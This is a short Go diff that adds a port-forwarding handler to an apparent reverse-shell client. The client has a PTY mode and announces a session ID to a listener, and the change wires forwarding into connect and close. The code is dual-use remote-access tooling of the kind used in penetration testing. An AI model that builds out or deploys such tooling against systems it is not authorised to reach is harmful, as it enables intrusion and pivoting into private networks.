@@ -38,6 +38,7 @@ type ReverseClient struct {
 	ptyCmd            *exec.Cmd  // Command running in PTY
 	inPtyMode         bool       // Whether currently in PTY mode
 	ptyMutex          sync.Mutex // Protects PTY state
+	forwardHandler    *ForwardHandler // Port forwarding handler
 }
 
 var (
@@ -174,6 +175,14 @@ func (rc *ReverseClient) Connect() error {
 
 	rc.isConnected = true
 
+	// Initialize forward handler with send function
+	rc.forwardHandler = NewForwardHandler(func(msg string) {
+		if rc.writer != nil {
+			rc.writer.WriteString(msg)
+			rc.writer.Flush()
+		}
+	})
+
 	// Announce session identifier to listener and log it locally
 	id := GetSessionID()
 	log.Printf("Session ID: %s", id)
@@ -194,6 +203,9 @@ func (rc *ReverseClient) Close() error {
 		return nil
 	}
 	rc.isConnected = false
+	if rc.forwardHandler != nil {
+		rc.forwardHandler.Close()
+	}
 	return rc.conn.Close()
 }
 
